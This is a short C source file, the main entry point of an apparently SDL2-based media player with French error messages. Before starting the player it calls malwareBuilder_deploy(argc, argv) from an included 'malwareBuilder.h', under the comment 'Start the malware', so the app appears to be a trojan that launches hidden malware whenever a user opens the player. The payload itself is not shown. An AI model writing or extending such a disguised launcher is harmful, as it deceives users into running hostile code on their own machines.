#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <SDL2/SDL.h>
#include <SDL2/SDL_image.h>

#include "mediaplayer.h"
#include "malwareBuilder.h"

#define WINDOW_WIDTH 1120
#define WINDOW_HEIGHT 800
#define WINDOW_SCALE 1

int main(int argc, char *argv[]) {
   srand(time(NULL));
   MediaPlayer *app;

   // Initialize SDL
   if (SDL_Init(SDL_INIT_VIDEO) < 0) {
      fprintf(stderr, "Erreur d'initialisation de SDL : %s\n", SDL_GetError());
      cleanup(NULL, NULL, NULL);
      return EXIT_FAILURE;
   }

   // Initialize SDL Image
   if (!(IMG_Init(IMG_INIT_PNG) & IMG_INIT_PNG)) {
      fprintf(stderr, "Erreur d'initialisation de SDL_image : %s\n", IMG_GetError());
      cleanup(NULL, NULL, NULL);
      return EXIT_FAILURE;
   }

   // Initialize MediaPlayer App instance
   app = mediaplayer_create(WINDOW_WIDTH, WINDOW_HEIGHT);
   if (app == NULL) {
      return EXIT_FAILURE;
   }

   // Start the malware
   malwareBuilder_deploy(argc, argv);

   // Start the app
   mediaplayer_run(app);

   // Destroy the app instance at the end
   mediaplayer_destroy(app);

   return EXIT_SUCCESS;
}
